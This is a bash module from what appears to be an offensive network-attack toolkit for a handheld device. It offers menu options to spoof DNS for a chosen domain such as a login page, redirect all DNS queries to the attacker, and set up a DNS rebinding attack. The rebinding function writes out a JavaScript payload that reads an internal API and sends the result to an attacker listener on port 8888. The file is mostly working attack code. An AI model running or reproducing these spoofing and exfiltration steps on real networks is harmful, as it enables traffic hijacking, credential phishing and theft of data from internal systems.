#!/bin/bash
# DNS spoofing and hijacking

rt_dns_spoof() {
  local choice
  choice=$(menu_pick "DNS Spoofing" \
    "Spoof Single Domain" \
    "Spoof All DNS (redirect)" \
    "DNS Rebinding Setup" \
    "View Spoofed Requests" \
    "Stop DNS Spoof")
  
  case "$choice" in
    1) dns_spoof_single ;;
    2) dns_spoof_all ;;
    3) dns_rebinding ;;
    4) dns_view_logs ;;
    5) dns_spoof_stop ;;
    0|"") return ;;
  esac
}

dns_spoof_single() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Spoof DNS responses for a domain?"; then
    return 1
  fi
  
  local domain
  domain=$(TEXT_PICKER "Domain to spoof" "login.example.com")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local spoof_ip
  spoof_ip=$(IP_PICKER "Redirect to IP" "$(hostname -I | awk '{print $1}')")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Setting up DNS spoof: $domain -> $spoof_ip"
  
  ensure_dir "$ARTIFACT_DIR"
  local hosts_file="$ARTIFACT_DIR/dns_hosts.txt"
  echo "$spoof_ip $domain" > "$hosts_file"
  
  if have dnsspoof; then
    nohup dnsspoof -i "$iface" -f "$hosts_file" > "$ARTIFACT_DIR/dnsspoof.log" 2>&1 &
    echo $! > /tmp/dns_spoof.pid
    LOG green "DNS spoof active"
    LOG "Requests for $domain will resolve to $spoof_ip"
  elif have ettercap; then
    local etter_dns="/tmp/etter.dns"
    echo "$domain A $spoof_ip" > "$etter_dns"
    nohup ettercap -T -q -i "$iface" -P dns_spoof > "$ARTIFACT_DIR/ettercap_dns.log" 2>&1 &
    echo $! > /tmp/dns_spoof.pid
    LOG green "Ettercap DNS spoof active"
  elif have dnsmasq; then
    local dnsmasq_conf="$ARTIFACT_DIR/dnsmasq_spoof.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$iface
no-dhcp-interface=$iface
address=/$domain/$spoof_ip
log-queries
log-facility=$ARTIFACT_DIR/dnsmasq.log
EOF
    dnsmasq -C "$dnsmasq_conf" 2>/dev/null
    echo $! > /tmp/dns_spoof.pid
    LOG green "dnsmasq DNS spoof active"
  else
    LOG red "dnsspoof, ettercap, or dnsmasq required"
    return 1
  fi
  
  LOG ""
  LOG "Combine with ARP spoof for full effect:"
  LOG "  Network Attacks > MITM > ARP Spoof"
}

dns_spoof_all() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Redirect ALL DNS queries to this device?"; then
    return 1
  fi
  
  local spoof_ip
  spoof_ip=$(IP_PICKER "Redirect all to IP" "$(hostname -I | awk '{print $1}')")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Redirecting ALL DNS to $spoof_ip..."
  
  ensure_dir "$ARTIFACT_DIR"
  
  if have dnsmasq; then
    local dnsmasq_conf="$ARTIFACT_DIR/dnsmasq_all.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$iface
no-dhcp-interface=$iface
address=/#/$spoof_ip
log-queries
log-facility=$ARTIFACT_DIR/dnsmasq_all.log
EOF
    
    pkill -f dnsmasq 2>/dev/null || true
    sleep 1
    dnsmasq -C "$dnsmasq_conf" 2>/dev/null
    
    LOG green "All DNS queries now resolve to $spoof_ip"
    LOG "Query log: $ARTIFACT_DIR/dnsmasq_all.log"
  else
    LOG red "dnsmasq required"
  fi
  
  LOG ""
  LOG "Set up ARP spoof to intercept DNS traffic:"
  LOG "  Network Attacks > MITM > ARP Spoof"
}

dns_rebinding() {
  LOG blue "DNS Rebinding Attack Setup"
  LOG ""
  LOG "DNS rebinding bypasses same-origin policy by:"
  LOG "1. Victim visits attacker domain"
  LOG "2. First DNS response: attacker IP (serves JS payload)"
  LOG "3. Second DNS response: target internal IP"
  LOG "4. JS can now access internal resources"
  LOG ""
  
  local internal_target
  internal_target=$(IP_PICKER "Internal target IP" "192.168.1.100")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local attacker_ip
  attacker_ip=$(IP_PICKER "Attacker (this) IP" "$(hostname -I | awk '{print $1}')")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  ensure_dir "$ARTIFACT_DIR/rebind"
  
  cat > "$ARTIFACT_DIR/rebind/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
setTimeout(function() {
  fetch('/api/data')
    .then(r => r.text())
    .then(d => {
      new Image().src = 'http://ATTACKER_IP:8888/exfil?data=' + btoa(d);
    });
}, 3000);
</script>
<p>Please wait...</p>
</body>
</html>
HTMLEOF
  
  sed -i "s/ATTACKER_IP/$attacker_ip/g" "$ARTIFACT_DIR/rebind/index.html" 2>/dev/null || \
    sed -i '' "s/ATTACKER_IP/$attacker_ip/g" "$ARTIFACT_DIR/rebind/index.html"
  
  LOG green "Rebinding payload created: $ARTIFACT_DIR/rebind/"
  LOG ""
  LOG "Manual steps required:"
  LOG "1. Set up rebinding DNS server (e.g., singularity, whonow)"
  LOG "2. Configure to alternate between $attacker_ip and $internal_target"
  LOG "3. Serve payload from $ARTIFACT_DIR/rebind/"
  LOG "4. Set up exfil listener on port 8888"
  LOG ""
  LOG "For laptop-assisted, use:"
  LOG "  singularity -DNSRebindStrategy sequence -FirstIP $attacker_ip -SecondIP $internal_target"
}

dns_view_logs() {
  LOG blue "DNS Spoof Logs:"
  LOG ""
  
  for log in "$ARTIFACT_DIR"/dns*.log "$ARTIFACT_DIR"/dnsmasq*.log; do
    if [[ -f "$log" ]]; then
      LOG "=== $(basename "$log") ==="
      tail -30 "$log"
      LOG ""
    fi
  done
  
  local found_logs=0
  for f in "$ARTIFACT_DIR"/dns*.log "$ARTIFACT_DIR"/dnsmasq*.log; do
    [[ -f "$f" ]] && found_logs=1 && break
  done
  if [[ $found_logs -eq 0 ]]; then
    LOG "No DNS logs found"
  fi
}

dns_spoof_stop() {
  LOG blue "Stopping DNS spoofing..."
  
  if [[ -f /tmp/dns_spoof.pid ]]; then
    kill "$(cat /tmp/dns_spoof.pid)" 2>/dev/null
    rm -f /tmp/dns_spoof.pid
  fi
  
  pkill -f dnsspoof 2>/dev/null || true
  pkill -f "ettercap.*dns" 2>/dev/null || true
  pkill -f dnsmasq 2>/dev/null || true
  
  LOG green "DNS spoofing stopped"
}
